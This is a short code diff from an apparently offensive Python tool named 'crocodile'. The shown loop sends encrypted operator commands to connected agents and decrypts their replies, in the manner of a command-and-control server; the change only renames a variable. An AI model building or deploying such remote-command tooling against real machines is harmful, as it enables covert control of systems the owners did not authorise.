@@ -19,9 +19,9 @@ class crocodile():
         """Inicia el servidor y escucha check-ins de agentes.""" 
         while True:
           comand = input(current_dir).encode("utf-8")
-          decrypted = self.encryptor.encrypt(comand.decode())
-          current_dir.send(decrypted)
-          print(decrypted)
+          Encript = self.encryptor.encrypt(comand.decode())
+          current_dir.send(Encript)
+          print(Encript)
           res = current_dir.recv(4096)
           if res:
             decrypted_response = self.encryptor.decrypt(res) 
